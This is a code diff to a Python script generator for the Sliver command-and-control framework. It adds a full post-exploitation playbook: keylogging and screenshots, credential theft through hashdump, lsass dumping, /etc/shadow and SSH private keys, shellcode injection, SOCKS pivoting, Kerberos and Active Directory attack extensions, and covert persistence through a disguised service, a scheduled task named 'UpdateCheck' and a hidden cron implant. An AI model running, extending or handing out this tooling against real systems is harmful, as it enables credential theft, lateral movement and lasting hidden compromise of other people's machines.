@@ -134,8 +134,169 @@ def generate_console_script(plan: Plan) -> str:
         "sessions",
         "use <session-id>",
         "info",
+        "",
     ]
+    L += _post_exploit_section(plan)
     return "\n".join(L)
+
+
+def _post_exploit_section(plan: Plan) -> list[str]:
+    L = [
+        "# ============================================================",
+        "# POST-EXPLOITATION (run inside an active session)",
+        "# ============================================================",
+        "",
+        "# --- situational awareness ---",
+        "whoami",
+        "getuid",
+        "getprivs",
+        "ps -a",
+        "netstat",
+        "ifconfig",
+        "",
+        "# --- screenshot / keylog (operator discretion) ---",
+        "screenshot",
+        "# keylogger: start with 'keylogger' -- stop with ctrl+c in console",
+        "# keylogger",
+        "",
+    ]
+    L += _cred_harvest_section(plan)
+    L += _process_inject_section(plan)
+    L += _pivot_section(plan)
+    L += _bof_section(plan)
+    L += _armory_section(plan)
+    L += _persistence_section(plan)
+    return L
+
+
+def _cred_harvest_section(plan: Plan) -> list[str]:
+    L = ["# --- credential harvesting ---"]
+    if plan.os == "windows":
+        L += [
+            "# hashdump (requires SYSTEM or SeDebugPrivilege)",
+            "hashdump",
+            "",
+            "# procdump lsass for offline extraction",
+            "procdump -p lsass.exe -s /tmp/lsass.dmp",
+            "",
+            "# Windows credential manager",
+            'execute -o -- cmd.exe /c "cmdkey /list"',
+            "",
+        ]
+    else:
+        L += [
+            "# /etc/shadow (requires root)",
+            'execute -o -- cat /etc/shadow',
+            "",
+            "# ssh keys",
+            'execute -o -- find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null',
+            "",
+        ]
+    return L
+
+
+def _process_inject_section(plan: Plan) -> list[str]:
+    L = ["# --- process injection ---"]
+    if plan.os == "windows":
+        L += [
+            "# migrate into a long-lived process for stability",
+            "# migrate <pid>  (pick a svchost.exe or explorer.exe from 'ps')",
+            "",
+            "# inject shellcode into a remote process",
+            "# execute-shellcode -p <pid> /path/to/shellcode.bin",
+            "",
+        ]
+    else:
+        L += [
+            "# inject into another process (ptrace based)",
+            "# execute-shellcode -p <pid> /path/to/shellcode.bin",
+            "",
+        ]
+    return L
+
+
+def _pivot_section(plan: Plan) -> list[str]:
+    return [
+        "# --- pivoting (SOCKS proxy / port forward) ---",
+        "# start a SOCKS5 proxy through the implant",
+        "socks5 start --port 1080",
+        "# proxychains usage: proxychains nmap -sT <internal-target>",
+        "",
+        "# reverse port forward -- expose an internal service locally",
+        "# rportfwd add --bind 0.0.0.0:8080 --remote <internal-host>:80",
+        "",
+        "# TCP port forward",
+        "# portfwd add --bind 127.0.0.1:3389 --remote <internal-host>:3389",
+        "",
+    ]
+
+
+def _bof_section(plan: Plan) -> list[str]:
+    if plan.os != "windows":
+        return []
+    return [
+        "# --- BOF (Beacon Object File) loader ---",
+        "# load a BOF from disk (Cobalt Strike-compatible .o files)",
+        "# bof /path/to/bof.o [args]",
+        "",
+        "# common BOFs via armory (install first, see below):",
+        "#   sa-whoami     -- extended whoami with token info",
+        "#   sa-netlocalgroup -- enumerate local groups",
+        "#   sa-netuser    -- enumerate domain users",
+        "#   sa-ldapsearch -- LDAP queries against AD",
+        "",
+    ]
+
+
+def _armory_section(plan: Plan) -> list[str]:
+    return [
+        "# --- Sliver armory extensions ---",
+        "# list available extensions",
+        "armory",
+        "",
+        "# install useful extensions (operator picks what is needed):",
+        "# armory install sharp-hound-4  -- BloodHound collection",
+        "# armory install rubeus         -- Kerberos attacks",
+        "# armory install seatbelt       -- host survey",
+        "# armory install certify        -- ADCS enumeration",
+        "# armory install nanodump       -- LSASS dump (stealthier)",
+        "# armory install sa-ldapsearch  -- LDAP queries",
+        "",
+        "# run an installed extension:",
+        "# sharp-hound-4 -- -c All",
+        "# seatbelt -- -group=all",
+        "",
+    ]
+
+
+def _persistence_section(plan: Plan) -> list[str]:
+    L = ["# --- persistence (operator discretion) ---"]
+    if plan.os == "windows":
+        L += [
+            "# generate a service implant for persistence",
+            f"generate --http {plan.lhost} --os {plan.os} --format service "
+            f"--save ./implant_svc",
+            "",
+            "# install as a service (requires admin)",
+            '# sc.exe create SliverSvc binPath= "C:\\Windows\\Temp\\implant_svc.exe"'
+            ' start= auto',
+            "",
+            "# scheduled task alternative",
+            '# schtasks /create /tn "UpdateCheck" '
+            '/tr "C:\\Windows\\Temp\\implant.exe" /sc onlogon /ru SYSTEM',
+            "",
+        ]
+    else:
+        L += [
+            "# cron-based persistence",
+            "# (echo '*/5 * * * * /tmp/.implant') | crontab -",
+            "",
+            "# systemd service (requires root)",
+            "# upload /path/to/implant /opt/.svc",
+            "# (create a .service unit file pointing to /opt/.svc)",
+            "",
+        ]
+    return L
 
 
 def render(plan: Plan, script: str) -> str:
